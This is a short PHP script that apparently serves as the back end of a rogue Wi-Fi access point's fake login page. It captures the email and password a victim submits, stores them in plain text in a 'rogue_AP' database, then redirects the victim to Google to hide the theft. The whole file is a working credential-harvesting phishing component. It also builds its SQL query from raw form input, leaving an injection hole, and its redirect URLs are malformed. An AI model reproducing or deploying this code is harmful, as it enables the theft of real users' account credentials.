<?php
    $name = test_input($_POST["name"]);
    if (!preg_match("/^[a-zA-Z ]*$/",$name)) {
       $nameErr = "Only letters and white space allowed";
    }
    else{
	    $host = "localhost";
	    $username = "fakeap";
	    $dbname = "rogue_AP";
	    $pwd = "fakeap";
	    $db = new mysqli($host,$username,$pwd,$dbname);

	    $email = $_POST['loginemail'];
	    $password = $_POST['loginpassword'];

	    $queryLogin = "INSERT INTO users (email,password) VALUES ('$email','$password')";
	    $sql = mysqli_query($db,$queryLogin);
	    if($sql){
	    	header("location: https:/google.com/");
	    }
	    else{
		header("location: https:/youtube.com/");
	    }
    }  
    
?>

